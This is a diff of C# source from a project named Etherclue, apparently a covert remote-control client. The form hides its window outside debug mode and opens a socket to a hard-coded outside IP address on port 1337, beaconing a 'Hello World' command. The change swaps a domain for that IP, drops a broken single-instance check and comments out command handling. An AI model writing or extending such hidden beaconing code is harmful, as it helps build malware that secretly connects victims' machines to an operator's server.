@@ -33,17 +33,13 @@ namespace Etherclue
 
         private void EtherclueMain_Load(object sender, EventArgs e)
         {
-            Process[] pname = Process.GetProcessesByName(Process.GetCurrentProcess.ProcessName);
-            if(pname.Length > 0)
-                this.close();
-                
             if (!Program.debug)
             {
                 this.Hide();
             }
-            socket = new clsSocket("moots.me", 1337);
+            socket = new clsSocket("64.52.86.179", 1337);
             socket.Send(new Command("Hello World", true).SendRequest());
-            CheckCommand(new Command(socket.Receive(), false));
+            //CheckCommand(new Command(socket.Receive(), false));
         }
 
         private void EtherclueMain_FormClosing(object sender, FormClosingEventArgs e)
